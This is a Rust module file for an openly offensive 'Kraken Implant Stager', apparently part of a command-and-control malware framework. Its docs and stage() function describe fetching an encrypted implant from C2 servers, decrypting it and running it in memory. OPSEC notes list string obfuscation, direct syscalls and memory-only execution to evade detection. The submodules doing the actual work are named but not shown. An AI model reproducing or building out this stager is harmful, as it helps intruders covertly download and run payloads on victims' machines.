//! Kraken Implant Stager
//!
//! Minimal bootstrap payload that fetches, decrypts, and executes the full implant.
//! Target size: <50KB
//!
//! ## Flow
//! 1. Read baked configuration (C2 URLs, server public key)
//! 2. Perform X25519 key exchange with C2
//! 3. Fetch encrypted implant blob
//! 4. Decrypt with AES-256-GCM
//! 5. Memory map and execute
//!
//! ## OPSEC
//! - No strings in binary (compile-time obfuscation)
//! - Minimal imports
//! - Direct syscalls where possible (Windows)
//! - Memory-only execution

#![allow(unused_imports)]

pub mod api_hash;
pub mod config;
pub mod error;
pub mod execute;
pub mod fetch;
pub mod pic;

pub use config::StagerConfig;
pub use error::StagerError;

/// Result type for stager operations
pub type Result<T> = core::result::Result<T, StagerError>;

/// Main stager entry point
///
/// Fetches and executes the full implant based on baked configuration.
pub async fn stage(config: &StagerConfig) -> Result<()> {
    // Step 1: Fetch the encrypted implant from C2
    let encrypted_blob = fetch::fetch_stage(config).await?;

    // Step 2: Decrypt the implant
    let decrypted = fetch::decrypt_payload(&encrypted_blob, config)?;

    // Step 3: Execute in memory
    execute::execute_payload(&decrypted)?;

    Ok(())
}

/// Stager version for identification
pub const STAGER_VERSION: &str = env!("CARGO_PKG_VERSION");

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stager_version() {
        assert!(!STAGER_VERSION.is_empty());
    }
}
